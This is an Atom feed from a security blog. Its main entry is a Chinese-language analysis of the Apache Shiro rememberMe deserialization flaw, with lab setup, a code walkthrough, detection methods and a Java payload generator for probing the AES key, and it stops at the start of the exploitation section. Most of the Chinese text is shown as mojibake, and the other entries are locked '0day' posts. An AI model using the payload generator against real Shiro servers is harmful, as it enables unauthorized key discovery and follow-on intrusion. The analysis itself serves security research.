<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.sari3l.com/"/>
  <updated>2020-09-17T07:15:35.296Z</updated>
  <id>https://blog.sari3l.com/</id>
  
  <author>
    <name>Sariel.D</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>üîê</title>
    <link href="https://blog.sari3l.com/posts/9a92d107/"/>
    <id>https://blog.sari3l.com/posts/9a92d107/</id>
    <published>2020-09-15T03:04:12.000Z</published>
    <updated>2020-09-17T07:15:35.296Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="27d109c0f5b184ee779feb8e7d741e34aab49f0a8176015015c51d8b5af7aa39"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Â∫îÂéÇÂïÜÈúÄÊ±ÇÂä†üîêÔºåÂæÖÂêàÈÄÇÊó∂Èó¥ÈáçÊñ∞ÂºÄÊîæÔºåËØ∑Âãø‰∫åÊ¨°Â§ñÊ≥Ñ
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>üîê</title>
    <link href="https://blog.sari3l.com/posts/fd03bf87/"/>
    <id>https://blog.sari3l.com/posts/fd03bf87/</id>
    <published>2020-09-14T16:09:16.000Z</published>
    <updated>2020-09-17T07:15:24.359Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="23c5e0d4e453963c2c11c702672daba0ef7eb50529d8396087d58ff8c2990103">8a6b57f33d1755f3d4ced00d3b81eb6dc3140cc81887cec2f8c303885531160ffa42fe8bcc83ac4e6789711f3c5c8dca7b65f880f5db69d847e7e9a22881eb23cddd6a6723a5e26be409e55cf2ac624d8204e83bb1e1618bca1d9bb98e8307a032f5e1af32089d37d35f9c5fb23d68a73bce20e3fff110946861bc3c2c8d26c5ed18b76d425486cb8be2f8b04862bf973dc7b190e5a76dd3e5c6b2fb1e4ba34b15ea90719526b87d5a3d98fbfd5b2d0b6e3bdac0c7ad67819a3b6e78d4ae8c5a25b0facd90fd04ab361b913e58fd844b3ca910d0846ccd22586e2c1f806df5330b65832e6f65377f404f4b5af1e665969a80bdd1d65711389ff71668f0e36d25dfdffba0309adb20234a50af43e2102f3387320be966db2e3ea28866fcde4205e3672760588131902cc7944b17a2f553fddfc3c85152d8f68aac013406d8eb7cd3a052616a2fc58afe04dd1f7b085f9416570b5f70d6adfb1ade88110dc8998fde596b7ca35ef35f4af0cc6e0cb70f5fac615ba3550cdc97c1885764f3935edcdeeffe0664fa04692f56eeb30e4bd3529d6844bd9ad952254f30a742b2e1dd93daa8e946b87c80b31500ec3fcb48323e99a99cf8d39a1672fed82cf2f50ba32017f7f0c459105612e7a4f07442455c0ed2a8e9029edd1a3cf8ab92fe93e3ca83e37aafa9419197ebe93c319a9c446e07d20403cea855bd0bdafbfa20d1f564e9e9e0adec96944430f50d83da2f34e93fab3e951829c60c648594be0d978c831ace9363a1feb6a919ba5fded83ae7ef732be86ca97b183c19f6351904735222c3e69a83850f33b9d5ffb5447c0a7d802cfab5e12a3ce06fa2040dc0e7d6d1636be7cda00b7249a4073ef3808fa0adb93823f389892b216f26cc2cb4a99ae6358441b147431f638d11302b0fe49d32adf3e48b70c5e096f359c2bdd745d829ecd737618c341110852639c839913c749aa914296b9566cbaffb2de1042cad1fe9eabbe9c5ffc58a96151e0d653dc9db7465cc58fa767531ef3d0d053b7209065d9b55c9699f6d8af62e554481970f8bf8af011b5c830e51222649ebe159462de2ed287c0bf913b996d19c2ebee43b6e849eb28644d3f560692b567db3a03d72da5f546c951ceadd52b3589530b31a4fa772022d93fbd1da0a6017e42fd6db0d69326088eec169d5b0eb55232e03a0fdb584aa7164758a40b6761414a05529c2c663d99d2710b3b1d20b77e2456ab89253031ad2b4fc5f8e4bd576f4cde063f839aa905fe8887e78e6fdaac6f9dc7ba395ceed831ddc26f90315091815251d64b9b3cf05c3d8d3568fb00bbd8e3de3cca5c095438f89311847a4e640e47ef8cfda184792fcc7bfd4d8cc9ca171088c739ef87cdf14331efafede4b1ef04f39c5f5a88795e3e661e8549479161d0b21f15aa213da397edb7a9ef83bb09d7ce6af8ff47ab3f1d0a47aec7feed704ad81b126872cae84ecd39f2f079be127698fbe06e4b45b562b1c580d64612b022d31604c83d47fbe571afe4116c995a7d220f65053b265c556be7400f903b8765ce21fe31ac5b8a7b9aaae284a58d774b27348cd885a1fff3ea1117eb9f9cf0adffefffff5c928b98aedaaf6a7674e6fcbf3294a9e2ef66bda592fdd2bb752b275943e5aefbf421d05c85c585f2ae6304d64153d6efa181eb72c28cf3864a6bb31b01f77a019c95349a88d204e918fb0f7d9fa3af173b255b2c5a49f9eddf0422879f0740b81fcb14535d7b346091fd5bb3610313cc012c3f4aeef519a960f21edd308254f36d31a452d5551df53841bd28a0bdff69249701ae60a459b8077dafa59571c95d88dcb720808a3295cda060ef4d294a3859473218c792e910d4e9753555b09fe1b6c939936d8b231c511df284b645db03784ea40897cd1227f3e169ac3f4abef</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Â∫îÂéÇÂïÜÈúÄÊ±ÇÂä†üîêÔºåÂæÖÂêàÈÄÇÊó∂Èó¥ÈáçÊñ∞ÂºÄÊîæÔºåËØ∑Âãø‰∫åÊ¨°Â§ñÊ≥Ñ
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>üîê</title>
    <link href="https://blog.sari3l.com/posts/df08045a/"/>
    <id>https://blog.sari3l.com/posts/df08045a/</id>
    <published>2020-09-12T14:02:11.000Z</published>
    <updated>2020-09-17T07:15:08.643Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7bec3b6f704ba254273cf62a294615a8d3154d584ade776e31fe1adbc5458861"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      üîê uid=0(root) gid=0(root) groups=0(root)
    
    </summary>
    
    
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="0day" scheme="https://blog.sari3l.com/tags/0day/"/>
    
  </entry>
  
  <entry>
    <title>üîê</title>
    <link href="https://blog.sari3l.com/posts/787c7e6c/"/>
    <id>https://blog.sari3l.com/posts/787c7e6c/</id>
    <published>2020-08-26T06:34:17.000Z</published>
    <updated>2020-09-17T07:14:55.539Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="acac395878fedade0de37d25ccb8e418674330c082082d5eae1aad269e41427c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      üîê ÂÜÖÈÉ®ÂàÜ‰∫´
    
    </summary>
    
    
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="0day" scheme="https://blog.sari3l.com/tags/0day/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-055 ÂàÜÊûê&amp;ÂõûÊòæ</title>
    <link href="https://blog.sari3l.com/posts/55ea3bd4/"/>
    <id>https://blog.sari3l.com/posts/55ea3bd4/</id>
    <published>2020-08-23T05:06:09.000Z</published>
    <updated>2020-08-23T05:10:03.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-ÂáÜÂ§á"><a href="#I-ÂáÜÂ§á" class="headerlink" title="I. ÂáÜÂ§á"></a>I. ÂáÜÂ§á</h2><p>‰ΩøÁî® docker hub Â∑≤ÊúâÁöÑÊºèÊ¥ûÁéØÂ¢ÉÔºåIDEA ÈÖçÁΩÆ Remote Debug</p><pre class=" language-shell"><code class="language-shell">> docker pull medicean/vulapps:s_shiro_1> docker run -d -p 8080:8080 -p 8090:8090 --env JAVA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=8090,server=y,suspend=n" medicean/vulapps:s_shiro_1</code></pre><p>ÊãâÂèñÊ∫êÁ†Å</p><pre class=" language-shell"><code class="language-shell">> git clone https://github.com/apache/shiro.git> git checkout shiro-root-1.2.4</code></pre><h2 id="II-ÊºèÊ¥ûÂéüÁêÜ"><a href="#II-ÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="II. ÊºèÊ¥ûÂéüÁêÜ"></a>II. ÊºèÊ¥ûÂéüÁêÜ</h2><p>ÂéüÂõ†ÊòØÂõ†‰∏∫Âú® org.apache.shiro.mgt.AbstractRememberMeManager ‰∏≠ÊúâÂÆö‰πâ‰ª•‰∏ãÂÜÖÂÆπÔºåÂØºËá¥ÊîªÂáªËÄÖÂà©Áî®ÈªòËÆ§ÂØÜÁ†ÅÂÆûÁé∞ÂèçÂ∫èÂàóÂåñRCE</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975905440609.jpg" alt="-w588"></p><ol><li><p>Â∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâø PrincipalCollection (ÂÆûÈôÖÈùûÂøÖÈ°ªÔºå‰∏ãÊñáÊúâËß£Èáä)</p></li><li><p>ËÆæÁΩÆÂä†ÂØÜÊñπÂºè‰∏∫ AES/CBC/PKCS5PaddingÔºåÂÖ∑‰ΩìÂèØÂú®org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService‰∏≠Êü•Áúã</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978155103697.jpg" alt="-w696"></p></li><li><p>Á°¨ÁºñÁ†ÅÈªòËÆ§Âä†ÂØÜÂØÜÈí• DEFAULT_CIPHER_KEY_BYTES</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975752216803.jpg" alt="-w888"></p></li></ol><h3 id="Âä†ÂØÜcookie"><a href="#Âä†ÂØÜcookie" class="headerlink" title="Âä†ÂØÜcookie"></a>Âä†ÂØÜcookie</h3><p>ÂΩìÁî®Êà∑ÁôªÈôÜÊàêÂäüÂπ∂‰∏îÈÄâÊã©remembermeÁöÑÊó∂ÂÄôÔºå‰ºöËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin ‰øùÂ≠òÊñ∞ÁöÑÈ™åËØÅ‰ø°ÊÅØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975913577431.jpg" alt="-w843"></p><p>Êé•ÁùÄÂú®rememberIdentityÂáΩÊï∞‰∏≠ÔºåÂÖàÈÄöËøágetIdentityToRememberËé∑ÂèñÂà∞Áî®Êà∑Ê†áÂøó‰ø°ÊÅØ</p><blockquote><p>Returns all principals associated with the corresponding Subject. Each principal is an identifying piece of information useful to the application such as a username, or user id, a given name, etc - anything useful to the application to identify the current Subject.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975918939762.jpg" alt="-w844"></p><p>ÂÜçËøõÂÖ•ÂêåÂêçÊñπÊ≥ïrememberIdentity‰∏≠ÔºåËøôÈáåÈ¶ñÂÖàÈÄöËøáconvertPrincipalsToBytesÂ∞ÜÁî®Êà∑‰ø°ÊÅØËΩ¨Êç¢Êàê byte Êï∞ÁªÑÔºåÂêéËøõË°å‰øùÂ≠ò</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975921483867.jpg" alt="-w744"></p><p>Êàë‰ª¨Êù•ÁúãconvertPrincipalsToBytesÔºåÂÖàËøõË°åÂ∫èÂàóÂåñÂêéÂÜçËøõË°åÂä†ÂØÜÔºåÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®Âä†ÂØÜÁÆóÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975917689368.jpg" alt="-w680"></p><p>Âú® org.apache.shiro.mgt.AbstractRememberMeManager#encrypt ‰∏≠Ë∞ÉÁî® AES Á±ªËøõË°åÂä†ÂØÜ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978076688353.jpg" alt="-w755"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978156691340.jpg" alt="-w423"></p><p>ÂÆûÈôÖÊòØË∞ÉÁî®<code>org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</code>Âíå<code>encrypt(byte[], byte[], byte[], boolean)</code>ÔºåÂèØ‰ª•ÁúãÂà∞Âú®ÊúÄÂêéÊòØÊää iv ÊîæÂú® crypt Âä†ÂØÜÂêéÁöÑÊï∞ÊçÆÂÜÖÂÆπÂâçÔºåÂÜçÊï¥‰ΩìËøîÂõû</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978160744231.jpg" alt="-w914"></p><p>ÊúÄÂêéËøõÂÖ•org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentityÔºåÂØπ‰ø°ÊÅØ base64ÁºñÁ†ÅÂêéÂ≠òÊîæÂÖ• cookie</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978164894987.jpg" alt="-w917"></p><h3 id="Ëß£ÂØÜcookie"><a href="#Ëß£ÂØÜcookie" class="headerlink" title="Ëß£ÂØÜcookie"></a>Ëß£ÂØÜcookie</h3><p>ÂΩìÁî®Êà∑Êê∫Â∏¶ rememberMe cookie ËøõË°åËÆøÈóÆÊó∂Ôºå‰ºöËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978175616743.jpg" alt="-w698"></p><p>Ë∞ÉÁî®Â≠êÁ±ªCookieRememberMeManager#getRememberedSerializedIdentityÊèêÂèñ cookieÔºåÈ¶ñÂÖàÂà§Êñ≠Èùû deleteMe ‰∏îËøõË°å base64 Â∞æÈÉ®Ê£ÄÊµãÂ°´ÂÖÖÂêéÔºåËøîÂõûÊúâÊïà cookie ÂõûÂà∞ AbstractRememberMeManager</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978177704065.jpg" alt="-w902"></p><p>‰πãÂêéÂú®org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals‰∏≠ÔºåÂ∞ùËØïËß£ÂØÜÂíåÂèçÂ∫èÂàóÂåñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178067478.jpg" alt="-w817"></p><p>Ëß£ÂØÜ‰Ωç‰∫éorg.apache.shiro.mgt.AbstractRememberMeManager#decrypt</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178548281.jpg" alt="-w772"></p><p>ÊúÄÂêéÁî±org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])Âíådecrypt(byte[], byte[], byte[])ÂÆûÁé∞Ëß£ÂØÜÔºåÊï¥‰∏™ÊµÅÁ®ãÈÉΩÂæàÂ∏∏ËßÑÔºå‰∏ªË¶ÅÂÖ≥Ê≥®ÊòØ‰ªé cookie Â§¥16‰ΩçÂ≠óËäÇÊï∞ÊçÆ‰∏∫ iv</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978180179924.jpg" alt="-w914"></p><h2 id="III-ÊºèÊ¥ûÊ£ÄÊµã"><a href="#III-ÊºèÊ¥ûÊ£ÄÊµã" class="headerlink" title="III. ÊºèÊ¥ûÊ£ÄÊµã"></a>III. ÊºèÊ¥ûÊ£ÄÊµã</h2><h3 id="1-Êó†ÊïàrememberMe"><a href="#1-Êó†ÊïàrememberMe" class="headerlink" title="1. Êó†ÊïàrememberMe"></a>1. Êó†ÊïàrememberMe</h3><p>Âè™ËÉΩÂø´ÈÄüÂà§Êñ≠ÊòØÂê¶‰ΩøÁî® shiro</p><h4 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>ÂΩìÊàë‰ª¨ËæìÂÖ•‰∏Ä‰∏™Êó†ÊïàÁöÑ rememberMe cookie Êó∂‰ºöÂõ†Êó†Ê≥ïËß£ÂØÜÊàñÂèçÂ∫èÂàóÂåñËß¶ÂèëÂºÇÂ∏∏ËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#onRememberedPrincipalFailure</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978187385340.jpg" alt="-w1177"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188176420.jpg" alt="-w923"></p><p>‰πãÂêéËøõÂÖ•org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188494866.jpg" alt="-w687"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188780907.jpg" alt="-w641"></p><p>ÊúÄÂêéË∞ÉÁî®org.apache.shiro.web.servlet.SimpleCookie#removeFromÊñπÊ≥ïÊ∑ªÂä† cookie <code>rememberMe=deleteMe</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978189943674.jpg" alt="-w910"></p><h4 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978190869603.jpg" alt="-w830"></p><h3 id="2-ÂèçÂ∫èÂàóÂåñ"><a href="#2-ÂèçÂ∫èÂàóÂåñ" class="headerlink" title="2. ÂèçÂ∫èÂàóÂåñ"></a>2. ÂèçÂ∫èÂàóÂåñ</h3><p>‰∏ªË¶ÅÂà©Áî®Ê≠£Â∏∏Ëß£ÂØÜÂêéÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®Ôºå‰ΩÜÂèçÂ∫èÂàóÂåñÁöÑÂâçÊèêÊòØË¶Å‰ΩøÁî®Ê≠£Á°ÆÁöÑ key ÂÆûÁé∞Ê≠£Â∏∏Ëß£ÂØÜ</p><h4 id="ÂéüÁêÜ-1"><a href="#ÂéüÁêÜ-1" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>‰ªé‰∏äÈù¢<strong>Êó†Êïà rememberMe</strong>‰∏ÄËäÇ‰∏≠Êàë‰ª¨ËøòÂèØ‰ª•Áü•ÈÅì</p><ul><li>ÂΩì key ÂåπÈÖç‰∏îÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂìçÂ∫î‰∏ç‰ºöËøîÂõû rememberMe=delete</li><li>ÂΩì key ‰∏çÂåπÈÖçÊó∂ÔºåÂìçÂ∫îËøîÂõû rememberMe=delete</li></ul><p><strong>ÈÇ£‰πàÂè™Ë¶Å‰øùËØÅÂ∫èÂàóÂåñÂØπË±°ÁöÑÊúâÊïàÊÄßÔºåÂ∞±ÂèØ‰ª•ÈÄöËøá‰∏äÈù¢ÁöÑÂ∑ÆÂºÇÊù•ÂÆûÁé∞ÂåπÈÖç Key</strong></p><p>Âõ†‰∏∫Â∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâøPrincipalCollectionÔºåÊâÄ‰ª•Êàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥®SimplePrincipalMap„ÄÅSimplePrincipalCollection</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978203984295.jpg" alt="-w850"></p><p>ÁÆÄÂçïÂÜô‰∏™ËÑöÊú¨Áî®‰∫éÁîüÊàê payload</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>PrincipalCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>SimplePrincipalMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">generate</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SimplePrincipalMap simplePrincipalMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePrincipalMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>simplePrincipalMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="ÊïàÊûú-1"><a href="#ÊïàÊûú-1" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h4><table><thead><tr><th>Key ÂåπÈÖç</th><th>Key ‰∏çÂåπÈÖç</th></tr></thead><tbody><tr><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978226467789.jpg" alt="-w828"></td><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978228045356.jpg" alt="-w829"></td></tr></tbody></table><h3 id="3-HTTPLog-or-DNSLog"><a href="#3-HTTPLog-or-DNSLog" class="headerlink" title="3. HTTPLog or DNSLog"></a>3. HTTPLog or DNSLog</h3><p>ÂÆûÈôÖ‰πüÊòØÂà©Áî®ÂèçÂ∫èÂàóÂåñÔºåÂè™ÊòØÁÆÄÂçïÁöÑÂêëÂ§ñËØ∑Ê±ÇËß£ÊûêÂüüÂêçÔºå‰ΩÜÊòØÂæàÂ§ö‰∫∫ÈÉΩÂñúÊ¨¢Áî®Ëøô‰∏™ÔºåÊâÄ‰ª•ÂçïÁã¨ÂàóÂá∫Êù•</p><p>XXXLog Âπ≥Âè∞Â¶ÇÊûúÊèê‰æõÊúâ API Â∞±ÂèØ‰ª•Ëá™Âä®ÂåñÊ£ÄÊµãÔºå‰ΩÜÊØïÁ´üÊ≠§ÊñπÊ≥ïÂèóÂ§™Â§öÂÆ¢ËßÇÂõ†Á¥†ÂΩ±ÂìçÔºå‰∏çÂª∫ËÆÆ</p><h2 id="IV-ÊºèÊ¥ûÂà©Áî®"><a href="#IV-ÊºèÊ¥ûÂà©Áî®" class="headerlink" title="IV. ÊºèÊ¥ûÂà©Áî®"></a>IV. ÊºèÊ¥ûÂà©Áî®</h2><p>Êàë‰ª¨ÂàöÊâçÊèêÂà∞‰∫ÜÔºåÂ∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâøPrincipalCollectionÔºåÈÇ£‰πàËøôÊòØÂøÖË¶ÅÁöÑ‰πàÔºüÂ¶ÇÊûúËÉΩÊ≤°ÊúâËøôÂ±ÇÈôêÂà∂ÔºåÊòØÂê¶ËÉΩÂà©Áî®ÂÖ∂‰ªñ gadget ËøõËÄåÂÆûÁé∞ RCE</p><p>Êàë‰ª¨ÂÖ≥Ê≥®Âà∞org.apache.shiro.mgt.AbstractRememberMeManager#deserializeÔºåËøôÈáåÊúÄÂêéË∞ÉÁî®ÁöÑÊòØorg.apache.shiro.io.DefaultSerializer#deserializeËøõË°åÂèçÂ∫èÂàóÂåñÔºåÂè™ÊòØÂú® return Êó∂‰ºöÂº∫Âà∂ËΩ¨Âåñ‰∏∫PrincipalCollectionÁ±ªÂûãÂØπË±°</p><p><img 